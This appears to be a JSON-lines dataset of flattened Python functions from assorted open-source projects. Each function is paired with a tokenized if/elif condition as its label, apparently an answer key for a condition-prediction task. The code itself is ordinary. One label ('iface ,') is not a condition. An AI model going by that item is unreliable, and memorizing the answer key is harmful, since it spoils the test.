{"input": "def wrap(request, *args, **kwargs): \"Wrap\" user = request.user.profile if \"massform\" in request.POST: for key in request.POST: if \"mass-changeset\" in key: try: changeset = ChangeSet.objects.get(pk=request.POST[key]) form = MassActionForm( request.user.profile, request.POST, instance=changeset ) if form.is_valid() and user.has_permission(changeset, mode=\"w\"): form.save() except Exception: pass return f(request, *args, **kwargs)", "label": "if \"mass-changeset\" in key :"}
{"input": "def select(self, browser, locator): assert browser is not None if locator is not None: if isinstance(locator, list): self._select_by_excludes(browser, locator) return if locator.lower() == \"self\" or locator.lower() == \"current\": return if locator.lower() == \"new\" or locator.lower() == \"popup\": self._select_by_last_index(browser) return (prefix, criteria) = self._parse_locator(locator) strategy = self._strategies.get(prefix) if strategy is None: raise ValueError(\"Window locator with prefix '\" + prefix + \"' is not supported\") return strategy(browser, criteria)", "label": "if locator . lower ( ) == \"new\" or locator . lower ( ) == \"popup\" :"}
{"input": "def test_all(self): for context in get_contexts(): found = False expected_context_name = context.get_name() for calculated_context in get_context(self.HTML, expected_context_name): if calculated_context.get_name() == expected_context_name: found = True if not found: msg = \"The analysis for %s context failed, got %r instead.\" msg = msg % ( expected_context_name, get_context(self.HTML, expected_context_name), ) self.assertTrue(False, msg)", "label": "if not found :"}
{"input": "def visit_title(self, node: Element) -> None: if isinstance(node.parent, addnodes.seealso): self.body.append('.IP \"') return elif isinstance(node.parent, nodes.section): if self.section_level == 0: # skip the document title raise nodes.SkipNode elif self.section_level == 1: self.body.append(\".SH %s\\n\" % self.deunicode(node.astext().upper())) raise nodes.SkipNode return super().visit_title(node)", "label": "if self . section_level == 0 :"}
{"input": "def parse_svn_stats(status): stats = RepoStats() for line in status: if line[0] == \"?\": stats.new += 1 elif line[0] == \"C\": stats.conflicted += 1 elif line[0] in [\"A\", \"D\", \"I\", \"M\", \"R\", \"!\", \"~\"]: stats.changed += 1 return stats", "label": "if line [ 0 ] == \"?\" :"}
{"input": "def setoutput(self, spec, defs=None): self.closespec() self.closedefs() if spec: if type(spec) == StringType: file = self.openoutput(spec) mine = 1 else: file = spec mine = 0 self.specfile = file self.specmine = mine if defs: if type(defs) == StringType: file = self.openoutput(defs) mine = 1 else: file = defs mine = 0 self.defsfile = file self.defsmine = mine", "label": "if type ( defs ) == StringType :"}
{"input": "def __new__(cls, name, bases, d): rv = type.__new__(cls, name, bases, d) if \"methods\" not in d: methods = set(rv.methods or []) for key, value in d.iteritems(): if key in http_method_funcs: methods.add(key.upper()) # if we have no method at all in there we don't want to # add a method list. (This is for instance the case for # the baseclass or another subclass of a base method view # that does not introduce new methods). if methods: rv.methods = sorted(methods) return rv", "label": "if key in http_method_funcs :"}
{"input": "def draw_lines(col, lines): skip = False for l in lines: if l: col.label(text=l) skip = False elif skip: continue else: col.label(text=l) skip = True", "label": "elif skip :"}
{"input": "def adjust_sockets(self): variables = self.get_variables() for key in self.inputs.keys(): if key not in variables and key not in [\"Field\"]: self.debug( \"Input {} not in variables {}, remove it\".format(key, str(variables)) ) self.inputs.remove(self.inputs[key]) for v in variables: if v not in self.inputs: self.debug( \"Variable {} not in inputs {}, add it\".format( v, str(self.inputs.keys()) ) ) self.inputs.new(\"SvStringsSocket\", v)", "label": "if v not in self . inputs :"}
{"input": "def forward(self, g, x): h = x for l, conv in enumerate(self.layers): h = conv(g, h) if l != len(self.layers) - 1: h = self.activation(h) h = self.dropout(h) return h", "label": "if l != len ( self . layers ) - 1 :"}
{"input": "def process_doc(self, docstrings: List[List[str]]) -> Iterator[str]: \"\"\"Let the user process the docstrings before adding them.\"\"\" for docstringlines in docstrings: if self.env.app: # let extensions preprocess docstrings self.env.app.emit( \"autodoc-process-docstring\", self.objtype, self.fullname, self.object, self.options, docstringlines, ) if docstringlines and docstringlines[-1] != \"\": # append a blank line to the end of the docstring docstringlines.append(\"\") yield from docstringlines", "label": "if self . env . app :"}
{"input": "def wiki(self, query): res = [] for entry in g.current_wiki.get_index(): name = filename_to_cname(entry[\"name\"]) name = re.sub(r\"//+\", \"/\", name) if set(query.split()).intersection(name.replace(\"/\", \"-\").split(\"-\")): page = g.current_wiki.get_page(name) # this can be None, not sure how if page: res.append(dict(name=name, content=page.data)) return res", "label": "if page :"}
{"input": "def checkForFinishedThreads(self): \"Mark terminated threads with endTime.\" for t in self.unfinishedThreads: if not t.is_alive(): t.endTime = time.process_time() if getattr(t, \"status\", None) is None: t.status = \"ended\"", "label": "if getattr ( t , \"status\" , None ) is None :"}
{"input": "def testTicketFlags(self): flags = (\"restored\", \"banned\") ticket = Ticket(\"test\", 0) trueflags = [] for v in (True, False, True): for f in flags: setattr(ticket, f, v) if v: trueflags.append(f) else: trueflags.remove(f) for f2 in flags: self.assertEqual(bool(getattr(ticket, f2)), f2 in trueflags) ## inherite props from another tockets: ticket = FailTicket(ticket=ticket) for f2 in flags: self.assertTrue(bool(getattr(ticket, f2)))", "label": "if v :"}
{"input": "def decode(obj, encoding=\"utf-8\", errors=\"strict\"): decoder = __decoder(encoding) if decoder: result = decoder(obj, errors) if not (isinstance(result, tuple) and len(result) == 2): raise TypeError(\"decoder must return a tuple (object, integer)\") return result[0]", "label": "if not ( isinstance ( result , tuple ) and len ( result ) == 2 ) :"}
{"input": "def work(self): \"\"\"Play the animation.\"\"\" # if loop_mode is once and we are already on the last frame, # return to the first frame... (so the user can keep hitting once) if self.loop_mode == LoopMode.ONCE: if self.step > 0 and self.current >= self.max_point - 1: self.frame_requested.emit(self.axis, self.min_point) elif self.step < 0 and self.current <= self.min_point + 1: self.frame_requested.emit(self.axis, self.max_point) self.timer.singleShot(int(self.interval), self.advance) else: # immediately advance one frame self.advance() self.started.emit()", "label": "if self . step > 0 and self . current >= self . max_point - 1 :"}
{"input": "def get_order(self, aStr): # for big5 encoding, we are interested # first byte range: 0xa4 -- 0xfe # second byte range: 0x40 -- 0x7e , 0xa1 -- 0xfe # no validation needed here. State machine has done that if aStr[0] >= \"\\xA4\": if aStr[1] >= \"\\xA1\": return 157 * (ord(aStr[0]) - 0xA4) + ord(aStr[1]) - 0xA1 + 63 else: return 157 * (ord(aStr[0]) - 0xA4) + ord(aStr[1]) - 0x40 else: return -1", "label": "if aStr [ 1 ] >= \"\\xA1\" :"}
{"input": "def validate_literals(self): try: for c in self.literals: if not isinstance(c, StringTypes) or len(c) > 1: self.log.error( \"Invalid literal %s. Must be a single character\", repr(c) ) self.error = True except TypeError: self.log.error( \"Invalid literals specification. literals must be a sequence of characters\" ) self.error = True", "label": "if not isinstance ( c , StringTypes ) or len ( c ) > 1 :"}
{"input": "def filter(self, qs, value): if value: if value.start is not None and value.stop is not None: value = (value.start, value.stop) elif value.start is not None: self.lookup_expr = \"startswith\" value = value.start elif value.stop is not None: self.lookup_expr = \"endswith\" value = value.stop return super().filter(qs, value)", "label": "elif value . stop is not None :"}
{"input": "def parse_stdout(s): argv = re.search(\"^===ARGV=(.*?)$\", s, re.M).group(1) argv = argv.split() testname = argv[-1] del argv[-1] hub = None reactor = None while argv: if argv[0] == \"--hub\": hub = argv[1] del argv[0] del argv[0] elif argv[0] == \"--reactor\": reactor = argv[1] del argv[0] del argv[0] else: del argv[0] if reactor is not None: hub += \"/%s\" % reactor return testname, hub", "label": "if argv [ 0 ] == \"--hub\" :"}
{"input": "def get(self, key): try: res = self.server.get( index=self.index, doc_type=self.doc_type, id=key, ) try: if res[\"found\"]: return res[\"_source\"][\"result\"] except (TypeError, KeyError): pass except elasticsearch.exceptions.NotFoundError: pass", "label": "if res [ \"found\" ] :"}
{"input": "def _get_target_chap_auth(self, context, volume): \"\"\"Get the current chap auth username and password.\"\"\" try: # Query DB to get latest state of volume volume_info = self.db.volume_get(context, volume[\"id\"]) # 'provider_auth': 'CHAP user_id password' if volume_info[\"provider_auth\"]: return tuple(volume_info[\"provider_auth\"].split(\" \", 3)[1:]) except exception.NotFound: LOG.debug(\"Failed to get CHAP auth from DB for %s.\", volume[\"id\"])", "label": "if volume_info [ \"provider_auth\" ] :"}
{"input": "def merge(self, hosts): for ei in self: host_name = ei.get_name() h = hosts.find_by_name(host_name) if h is not None: # FUUUUUUUUUUsion self.merge_extinfo(h, ei)", "label": "if h is not None :"}
{"input": "def __init__(self, user, *args, **kwargs): \"Sets choices and initial value\" super(SettingsForm, self).__init__(*args, **kwargs) self.fields[\"default_changeset_status\"].queryset = ChangeSetStatus.objects.filter( trash=False ) try: conf = ModuleSetting.get_for_module( \"treeio.changes\", \"default_changeset_status\" )[0] default_changeset_status = ChangeSetStatus.objects.get(pk=long(conf.value)) if not default_changeset_status.trash: self.fields[ \"default_changeset_status\" ].initial = default_changeset_status.id except Exception: pass", "label": "if not default_changeset_status . trash :"}
{"input": "def load(self): \"\"\"Method for loading a feature\"\"\" with self.filesystem.openbin(self.path, \"r\") as file_handle: if self.path.endswith(FileFormat.GZIP.extension()): with gzip.open(file_handle, \"rb\") as gzip_fp: return self._decode(gzip_fp, self.path) return self._decode(file_handle, self.path)", "label": "if self . path . endswith ( FileFormat . GZIP . extension ( ) ) :"}
{"input": "def edge2str(self, nfrom, nto): if isinstance(nfrom, ExprCompose): for i in nfrom.args: if i[0] == nto: return \"[%s, %s]\" % (i[1], i[2]) elif isinstance(nfrom, ExprCond): if nfrom.cond == nto: return \"?\" elif nfrom.src1 == nto: return \"True\" elif nfrom.src2 == nto: return \"False\" return \"\"", "label": "if i [ 0 ] == nto :"}
{"input": "def disable_verity(): \"\"\"Disables dm-verity on the device.\"\"\" with log.waitfor(\"Disabling dm-verity on %s\" % context.device): root() with AdbClient() as c: reply = c.disable_verity() if \"Verity already disabled\" in reply: return elif \"Now reboot your device\" in reply: reboot(wait=True) elif \"0006closed\" in reply: return # Emulator doesnt support Verity? else: log.error(\"Could not disable verity:\\n%s\" % reply)", "label": "elif \"0006closed\" in reply :"}
{"input": "def __demo_mode_pause_if_active(self, tiny=False): if self.demo_mode: wait_time = settings.DEFAULT_DEMO_MODE_TIMEOUT if self.demo_sleep: wait_time = float(self.demo_sleep) if not tiny: time.sleep(wait_time) else: time.sleep(wait_time / 3.4) elif self.slow_mode: self.__slow_mode_pause_if_active()", "label": "if not tiny :"}
{"input": "def dictToKW(d): out = [] items = list(d.items()) items.sort() for k, v in items: if not isinstance(k, str): raise NonFormattableDict(\"%r ain't a string\" % k) if not r.match(k): raise NonFormattableDict(\"%r ain't an identifier\" % k) out.append(\"\\n\\0{}={},\".format(k, prettify(v))) return \"\".join(out)", "label": "if not isinstance ( k , str ) :"}
{"input": "def createCommonCommands(self): \"\"\"Handle all global @command nodes.\"\"\" c = self.c aList = c.config.getCommands() or [] for z in aList: p, script = z gnx = p.v.gnx if gnx not in self.seen: self.seen.add(gnx) script = self.getScript(p) self.createCommonCommand(p, script)", "label": "if gnx not in self . seen :"}
{"input": "def _decodeFromStream(self, s): \"\"\"Decode a complete DER OBJECT ID from a file.\"\"\" # Fill up self.payload DerObject._decodeFromStream(self, s) # Derive self.value from self.payload p = BytesIO_EOF(self.payload) comps = list(map(str, divmod(p.read_byte(), 40))) v = 0 while p.remaining_data(): c = p.read_byte() v = v * 128 + (c & 0x7F) if not (c & 0x80): comps.append(str(v)) v = 0 self.value = \".\".join(comps)", "label": "if not ( c & 0x80 ) :"}
{"input": "def tiles_around_factor(self, factor, pos, radius=1, predicate=None): ps = [] x, y = pos for dx in range(-radius, radius + 1): nx = x + dx if nx >= 0 and nx < self.width * factor: for dy in range(-radius, radius + 1): ny = y + dy if ny >= 0 and ny < self.height * factor and (dx != 0 or dy != 0): if predicate is None or predicate((nx, ny)): ps.append((nx, ny)) return ps", "label": "if nx >= 0 and nx < self . width * factor :"}
{"input": "def deleteAllMatchers(self): \"\"\"Deletes all matchers.\"\"\" if self.__filter: result = QtWidgets.QMessageBox.question( self, \"Delete All Matchers?\", \"Are you sure you want to delete all matchers?\", QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No, ) if result == QtWidgets.QMessageBox.Yes: self._itemsLock.lockForWrite() try: for item in list(self._items.values()): item.rpcObject.delete() finally: self._itemsLock.unlock() self.removeAllItems()", "label": "if result == QtWidgets . QMessageBox . Yes :"}
{"input": "def _parse_icons(self, icons): if isinstance(icons, list): icons = get_iterated_icons(icons) for icon in icons: if isinstance(icons, list): icon = Icon(icon) else: icon = Icon(icons[icon]) if icon.exists: # If icon found on current Gtk Icon theme self.icons.append(icon)", "label": "if isinstance ( icons , list ) :"}
{"input": "def change_misc_visibility(self, on_start=False): if self.misc.isVisible(): self._splitterMainSizes = self._splitterMain.sizes() self.misc.hide() widget = self.mainContainer.get_actual_widget() if widget: widget.setFocus() else: self.misc.show() self.misc.gain_focus()", "label": "if widget :"}
{"input": "def is_checked_sls_template(template): if template.__contains__(\"provider\"): # Case provider is a dictionary if isinstance(template[\"provider\"], dict_node): if template[\"provider\"].get(\"name\").lower() not in SUPPORTED_PROVIDERS: return False # Case provider is direct provider name if isinstance(template[\"provider\"], str_node): if template[\"provider\"] not in SUPPORTED_PROVIDERS: return False return True return False", "label": "if template [ \"provider\" ] not in SUPPORTED_PROVIDERS :"}
{"input": "def check_index(self, is_sorted=True, unique=True, index=None): \"\"\"Sanity checks\"\"\" if not index: index = self.index if is_sorted: test = pd.DataFrame(lrange(len(index)), index=index) test_sorted = test.sort() if not test.index.equals(test_sorted.index): raise Exception(\"Data is not be sorted\") if unique: if len(index) != len(index.unique()): raise Exception(\"Duplicate index entries\")", "label": "if not test . index . equals ( test_sorted . index ) :"}
{"input": "def _update_actions(self, *_ignored): \"\"\"Updates menu actions to reflect the current layer's mode\"\"\" if self._updating: return self._updating = True rootstack = self._model.layer_stack current = rootstack.current for mode, item in self._menu_items: active = mode == current.mode if bool(item.get_active()) != active: item.set_active(active) item.set_sensitive(mode in current.PERMITTED_MODES) self._updating = False", "label": "if bool ( item . get_active ( ) ) != active :"}
{"input": "def _charlabels(self, options): \"\"\"Get labels for characters (PRIVATE).\"\"\" self.charlabels = {} opts = CharBuffer(options) while True: # get id and state w = opts.next_word() if w is None: # McClade saves and reads charlabel-lists with terminal comma?! break identifier = self._resolve(w, set_type=CHARSET) state = quotestrip(opts.next_word()) self.charlabels[identifier] = state # check for comma or end of command c = opts.next_nonwhitespace() if c is None: break elif c != \",\": raise NexusError(\"Missing ',' in line %s.\" % options)", "label": "if w is None :"}
{"input": "def get_and_set_titles(self): all_titles = [] for page in self.pages: if page.orig_phrase != \"\": all_titles.append(page.orig_phrase) all_titles.append(page.orig_phrase_norm) if page.wiki_title != \"\": all_titles.append(page.wiki_title) all_titles.append(page.wiki_title_norm) return set(all_titles)", "label": "if page . orig_phrase != \"\" :"}
{"input": "def get_content_length(download): try: meta = download.info() if hasattr(meta, \"getheaders\") and hasattr(meta.getheaders, \"Content-Length\"): return int(meta.getheaders(\"Content-Length\")[0]) elif hasattr(download, \"getheader\") and download.getheader(\"Content-Length\"): return int(download.getheader(\"Content-Length\")) elif hasattr(meta, \"getheader\") and meta.getheader(\"Content-Length\"): return int(meta.getheader(\"Content-Length\")) except Exception: pass return 0", "label": "if hasattr ( meta , \"getheaders\" ) and hasattr ( meta . getheaders , \"Content-Length\" ) :"}
{"input": "def connect_reader_to_writer(reader, writer): BUF_SIZE = 8192 try: while True: data = await reader.read(BUF_SIZE) if not data: if not writer.transport.is_closing(): writer.write_eof() await writer.drain() return writer.write(data) await writer.drain() except (OSError, asyncio.IncompleteReadError) as e: pass", "label": "if not writer . transport . is_closing ( ) :"}
{"input": "def _record_shell(ex, files, bind_rez=True, print_msg=False): ex.source(context_file) if startup_sequence[\"envvar\"]: ex.unsetenv(startup_sequence[\"envvar\"]) if add_rez and bind_rez: ex.interpreter._bind_interactive_rez() if print_msg and add_rez and not quiet: ex.info(\"\") ex.info(\"You are now in a rez-configured environment.\") ex.info(\"\") if system.is_production_rez_install: ex.command(\"rezolve context\")", "label": "if system . is_production_rez_install :"}
{"input": "def set_torrent_ratio(self, torrent_ids, ratio): try: if not self.connect(): return False self.client.core.set_torrent_stop_at_ratio(torrent_ids, True).get() self.client.core.set_torrent_stop_ratio(torrent_ids, ratio).get() except Exception as err: return False finally: if self.client: self.disconnect() return True", "label": "if self . client :"}
{"input": "def __decrypt_bin_sum(encrypted_bin_sum, cipher): # for feature_sum in encrypted_bin_sum: decrypted_list = {} for col_name, count_list in encrypted_bin_sum.items(): new_list = [] for event_count, non_event_count in count_list: if isinstance(event_count, PaillierEncryptedNumber): event_count = cipher.decrypt(event_count) if isinstance(non_event_count, PaillierEncryptedNumber): non_event_count = cipher.decrypt(non_event_count) new_list.append((event_count, non_event_count)) decrypted_list[col_name] = new_list return decrypted_list", "label": "if isinstance ( event_count , PaillierEncryptedNumber ) :"}
{"input": "def processVideo(self, track): video = Metadata(self) self.trackCommon(track, video) try: video.compression = track[\"CodecID/string\"].value if \"Video\" in track: video.width = track[\"Video/PixelWidth/unsigned\"].value video.height = track[\"Video/PixelHeight/unsigned\"].value except MissingField: pass self.addGroup(\"video[]\", video, \"Video stream\")", "label": "if \"Video\" in track :"}
{"input": "def check_br_addr(self, br): ips = {} cmd = \"ip a show dev %s\" % br for line in self.execute(cmd, sudo=True).split(\"\\n\"): if line.strip().startswith(\"inet \"): elems = [e.strip() for e in line.strip().split(\" \")] ips[4] = elems[1] elif line.strip().startswith(\"inet6 \"): elems = [e.strip() for e in line.strip().split(\" \")] ips[6] = elems[1] return ips", "label": "if line . strip ( ) . startswith ( \"inet \" ) :"}
{"input": "def _find_line_in_file(file_path, search_pattern): try: with open(file_path, \"r\", encoding=\"utf-8\") as search_file: for line in search_file: if search_pattern in line: return True except (OSError, IOError): pass return False", "label": "if search_pattern in line :"}
{"input": "def setOption(self, key, value): if key in VALID_OPTIONS: old = self.getOption(key) result = VALID_OPTIONS[key](self, value) self.notifyOptionChanged(key, old, value) if result: return result[1] else: raise RopperError(\"Invalid value for option %s: %s\" % (key, value)) else: raise RopperError(\"Invalid option\")", "label": "if result :"}
{"input": "def _para_exploit(self, params, part): if len(params) == 0: arr = [\"*\", \"config\"] + self._configs.keys() return suggest(arr, part) if len(params) == 1: arr = [] if params[0] == \"config\": arr = self._configs.keys() if params[0] == \"*\": arr = [\"stopOnFirst\"] return suggest(arr, part) return []", "label": "if params [ 0 ] == \"*\" :"}
{"input": "def render(self, context): for var in self.vars: value = var.resolve(context, True) if value: first = render_value_in_context(value, context) if self.asvar: context[self.asvar] = first return \"\" return first return \"\"", "label": "if self . asvar :"}
{"input": "def insertTestData(self, rows): for row in rows: if isinstance(row, Log): self.logs[row.id] = row.values.copy() for row in rows: if isinstance(row, LogChunk): lines = self.log_lines.setdefault(row.logid, []) # make sure there are enough slots in the list if len(lines) < row.last_line + 1: lines.append([None] * (row.last_line + 1 - len(lines))) row_lines = row.content.decode(\"utf-8\").split(\"\\n\") lines[row.first_line : row.last_line + 1] = row_lines", "label": "if len ( lines ) < row . last_line + 1 :"}
{"input": "def set_available_qty(self): for d in self.get(\"required_items\"): if d.source_warehouse: d.available_qty_at_source_warehouse = get_latest_stock_qty( d.item_code, d.source_warehouse ) if self.wip_warehouse: d.available_qty_at_wip_warehouse = get_latest_stock_qty( d.item_code, self.wip_warehouse )", "label": "if self . wip_warehouse :"}
{"input": "def add_pref_observer(self, name, callback): self.log.debug(\"Adding pref observer for %s\", name) try: self._observers[name].add(callback) except KeyError: self._observers[name] = set([callback]) if self._send: self._send(command=\"global-prefs-observe\", add=[name]) else: # We can't actually trigger prefs observer changes on document # level prefs; that's mostly okay, though, since we just pass # the whole prefs environment every time we do something with a # document instead. pass", "label": "if self . _send :"}
{"input": "def __setattr__(self, key: str, value) -> None: try: object.__getattribute__(self, key) return object.__setattr__(self, key, value) except AttributeError: pass if (key,) in self._internal.column_labels: self[key] = value else: msg = \"Koalas doesn't allow columns to be created via a new attribute name\" if is_testing(): raise AssertionError(msg) else: warnings.warn(msg, UserWarning)", "label": "if is_testing ( ) :"}
{"input": "def inverse_transform(self, X): results = [] column_counter = 0 for i, binarizer in enumerate(self.binarizers): n_cols = binarizer.classes_.shape[0] x_subset = X[:, column_counter : column_counter + n_cols] inv = binarizer.inverse_transform(x_subset) if len(inv.shape) == 1: inv = inv[:, np.newaxis] results.append(inv) column_counter += n_cols return np.concatenate(results, axis=1)", "label": "if len ( inv . shape ) == 1 :"}
{"input": "def default_generator( self, dataset, epochs=1, mode=\"fit\", deterministic=True, pad_batches=True ): for epoch in range(epochs): for (X_b, y_b, w_b, ids_b) in dataset.iterbatches( batch_size=self.batch_size, deterministic=deterministic, pad_batches=pad_batches, ): if mode == \"predict\": dropout = np.array(False) else: dropout = np.array(True) yield ([X_b, dropout], [y_b], [w_b])", "label": "if mode == \"predict\" :"}
{"input": "def modif(dir, name, fun): \"\"\"Call a substitution function\"\"\" if name == \"*\": lst = [] for y in \". Tools extras\".split(): for x in os.listdir(os.path.join(dir, y)): if x.endswith(\".py\"): lst.append(y + os.sep + x) for x in lst: modif(dir, x, fun) return filename = os.path.join(dir, name) with open(filename, \"r\") as f: txt = f.read() txt = fun(txt) with open(filename, \"w\") as f: f.write(txt)", "label": "if x . endswith ( \".py\" ) :"}
{"input": "def find_last_match(view, what, start, end, flags=0): \"\"\"Find last occurrence of `what` between `start`, `end`.\"\"\" match = view.find(what, start, flags) new_match = None while match: new_match = view.find(what, match.end(), flags) if new_match and new_match.end() <= end: match = new_match else: return match", "label": "if new_match and new_match . end ( ) <= end :"}
{"input": "def to_dynamic_cwd_tuple(x): \"\"\"Convert to a canonical cwd_width tuple.\"\"\" unit = \"c\" if isinstance(x, str): if x[-1] == \"%\": x = x[:-1] unit = \"%\" else: unit = \"c\" return (float(x), unit) else: return (float(x[0]), x[1])", "label": "if x [ - 1 ] == \"%\" :"}
{"input": "def get_lprobs_and_target(self, model, net_output, sample): lprobs = model.get_normalized_probs(net_output, log_probs=True) target = model.get_targets(sample, net_output) if self.ignore_prefix_size > 0: if getattr(lprobs, \"batch_first\", False): lprobs = lprobs[:, self.ignore_prefix_size :, :].contiguous() target = target[:, self.ignore_prefix_size :].contiguous() else: lprobs = lprobs[self.ignore_prefix_size :, :, :].contiguous() target = target[self.ignore_prefix_size :, :].contiguous() return lprobs.view(-1, lprobs.size(-1)), target.view(-1)", "label": "if getattr ( lprobs , \"batch_first\" , False ) :"}
{"input": "def _charlabels(self, options): \"\"\"Get labels for characters (PRIVATE).\"\"\" self.charlabels = {} opts = CharBuffer(options) while True: # get id and state w = opts.next_word() if w is None: # McClade saves and reads charlabel-lists with terminal comma?! break identifier = self._resolve(w, set_type=CHARSET) state = quotestrip(opts.next_word()) self.charlabels[identifier] = state # check for comma or end of command c = opts.next_nonwhitespace() if c is None: break elif c != \",\": raise NexusError(\"Missing ',' in line %s.\" % options)", "label": "if c is None :"}
{"input": "def _parseContributors(self, roleType, Contributors): if Contributors is None: return None try: ret = [] for item in Contributors[\"items\"]: if item[\"role\"] == roleType: ret.append(item[\"name\"]) return ret except: return None", "label": "if item [ \"role\" ] == roleType :"}
{"input": "def _data_interp(self): if self.pending_points: points = list(self.pending_points) if self.bounds_are_done: values = self.ip()(self._scale(points)) else: # Without the bounds the interpolation cannot be done properly, # so we just set everything to zero. values = np.zeros((len(points), self.vdim)) return points, values return np.zeros((0, 2)), np.zeros((0, self.vdim), dtype=float)", "label": "if self . bounds_are_done :"}
{"input": "def _initCaseSets(self): self._cs = {} self._css = {} for cs in self._caseSets: if not self._cs.has_key(cs.CaseSetName): self._cs[cs.CaseSetName] = {} self._css[cs.CaseSetName] = cs else: raise Exception(\"duplicate case set name\") for c in cs.Cases: idx = tuple(c.index) if not self._cs[cs.CaseSetName].has_key(idx): self._cs[cs.CaseSetName][idx] = c else: raise Exception(\"duplicate case index\")", "label": "if not self . _cs . has_key ( cs . CaseSetName ) :"}
{"input": "def _organize_data(self, data): temporary = {} for line in data.splitlines(): category, _, value = line.partition(\" \") if category in (\"set\", \"tag\"): key, _, value = value.partition(\" \") temporary[key] = value else: temporary[category] = value return temporary", "label": "if category in ( \"set\" , \"tag\" ) :"}
{"input": "def get(self): \"\"\"Returns a simple HTML for contact form\"\"\" if self.user: user_info = models.User.get_by_id(long(self.user_id)) if user_info.name or user_info.last_name: self.form.name.data = user_info.name + \" \" + user_info.last_name if user_info.email: self.form.email.data = user_info.email params = {\"exception\": self.request.get(\"exception\")} return self.render_template(\"boilerplate_contact.html\", **params)", "label": "if user_info . email :"}
{"input": "def parseBamPEFDistributionFile(self, f): d = dict() lastsample = [] for line in f[\"f\"].splitlines(): cols = line.rstrip().split(\"\\t\") if cols[0] == \"#bamPEFragmentSize\": continue elif cols[0] == \"Size\": continue else: s_name = self.clean_s_name(cols[2].rstrip().split(\"/\")[-1], f[\"root\"]) if s_name != lastsample: d[s_name] = dict() lastsample = s_name d[s_name].update({self._int(cols[0]): self._int(cols[1])}) return d", "label": "elif cols [ 0 ] == \"Size\" :"}
{"input": "def _related(self): if self.__related is None: results = requests.get( f\"{self._wordnet_corpus_reader.host()}/api/synsets/{self.pos()}/{self.offset()}/relations/?format=json\", timeout=(30.0, 90.0), ) if results and len(results.json()[\"results\"]) != 0: self.__related = results.json()[\"results\"][0][\"relations\"] else: self.__related = [] return self.__related", "label": "if results and len ( results . json ( ) [ \"results\" ] ) != 0 :"}
{"input": "def autoname(self): if self.company: suffix = \" - \" + frappe.get_cached_value(\"Company\", self.company, \"abbr\") if not self.warehouse_name.endswith(suffix): self.name = self.warehouse_name + suffix else: self.name = self.warehouse_name", "label": "if not self . warehouse_name . endswith ( suffix ) :"}
{"input": "def escape_string(self, value): value = EscapedString.promote(value) value = value.expanduser() result = \"\" for is_literal, txt in value.strings: if is_literal: txt = pipes.quote(txt) if not txt.startswith(\"'\"): txt = \"'%s'\" % txt else: txt = txt.replace(\"\\\\\", \"\\\\\\\\\") txt = txt.replace('\"', '\\\\\"') txt = '\"%s\"' % txt result += txt return result", "label": "if is_literal :"}
{"input": "def downgrade_wsgi_ux_to_1x(environ): \"\"\"Return a new environ dict for WSGI 1.x from the given WSGI u.x environ.\"\"\" env1x = {} url_encoding = environ[ntou(\"wsgi.url_encoding\")] for k, v in list(environ.items()): if k in [ntou(\"PATH_INFO\"), ntou(\"SCRIPT_NAME\"), ntou(\"QUERY_STRING\")]: v = v.encode(url_encoding) elif isinstance(v, unicodestr): v = v.encode(\"ISO-8859-1\") env1x[k.encode(\"ISO-8859-1\")] = v return env1x", "label": "elif isinstance ( v , unicodestr ) :"}
{"input": "def __repr__(self): rt = \"Network Netmask Gateway Iface Output IP\\n\" for net, msk, gw, iface, addr in self.routes: rt += \"%-15s %-15s %-15s %-15s %-15s\\n\" % ( ltoa(net), ltoa(msk), gw, iface, addr, ) return rt", "label": "iface ,"}
{"input": "def nearest_sources_Point( self, point: Point, max_dist=float(\"inf\") ): # sys.float_info.max): bp, bn, bi, bd = None, None, None, None for rfsource in self.rfsources: if not self.get_rfsource_snap(rfsource): continue hp, hn, hi, hd = rfsource.nearest(point, max_dist=max_dist) if bp is None or (hp is not None and hd < bd): bp, bn, bi, bd = hp, hn, hi, hd return (bp, bn, bi, bd)", "label": "if not self . get_rfsource_snap ( rfsource ) :"}
{"input": "def restoreParent(self): if self.sid.isRoot: return with self.suspendMouseButtonNavigation(): confirm, opt = self.confirmRestore((self.path,)) if not confirm: return if opt[\"delete\"] and not self.confirmDelete(warnRoot=self.path == \"/\"): return rd = RestoreDialog(self, self.sid, self.path, **opt) rd.exec()", "label": "if opt [ \"delete\" ] and not self . confirmDelete ( warnRoot = self . path == \"/\" ) :"}
{"input": "def connect(self): if self.reserved_ports: self.get_reserved_port() self.sock.settimeout(10) max_attempts = 3 for i in range(max_attempts): try: rv = super(WSClient, self).connect() except OSError as e: # Lets retry a few times in case the error is # [Errno 48] Address already in use # which I believe may be caused by a race condition if e.errno == errno.EADDRINUSE and i < max_attempts - 1: continue raise else: break if self.sock: self.sock.settimeout(None) return rv", "label": "if e . errno == errno . EADDRINUSE and i < max_attempts - 1 :"}
{"input": "def step(self, action): assert self.action_space.contains(action) if self._state == 4: if action and self._case: return self._state, 10.0, True, {} else: return self._state, -10, True, {} else: if action: if self._state == 0: self._state = 2 else: self._state += 1 elif self._state == 2: self._state = self._case return self._state, -1, False, {}", "label": "elif self . _state == 2 :"}
{"input": "def process(self): inputs = self.node.inputs outputs = self.node.outputs data = [s.sv_get()[0] for s in inputs] for socket, ref in zip(outputs, self.outputs): if socket.links: func = getattr(self, ref[2]) out = tuple(itertools.starmap(func, sv_zip_longest(*data))) socket.sv_set(out)", "label": "if socket . links :"}
{"input": "def filter_queryset(self, request, queryset, view): if ( self.filter_name in request.QUERY_PARAMS or self.exclude_param_name in request.QUERY_PARAMS ): projects_ids_subquery = self.filter_user_projects(request) if projects_ids_subquery: queryset = queryset.filter(project_id__in=projects_ids_subquery) return super().filter_queryset(request, queryset, view)", "label": "if projects_ids_subquery :"}
{"input": "def _is_port_in_range(self, ports_list): for port_range in ports_list[0]: port = force_int(port_range) if port and self.port == port: return True if port is None and \"-\" in port_range: try: [from_port, to_port] = port_range.split(\"-\") if int(from_port) <= self.port <= int(to_port): return True except Exception: return CheckResult.UNKNOWN return False", "label": "if port is None and \"-\" in port_range :"}
{"input": "def apply_to(cls, lexer): # Apply a font for all styles lexer.setFont(Font().load()) for name, font in cls.__dict__.items(): if not isinstance(font, Font): continue if hasattr(lexer, name): style_num = getattr(lexer, name) lexer.setColor(QColor(font.color), style_num) lexer.setEolFill(True, style_num) lexer.setPaper(QColor(font.paper), style_num) lexer.setFont(font.load(), style_num)", "label": "if hasattr ( lexer , name ) :"}
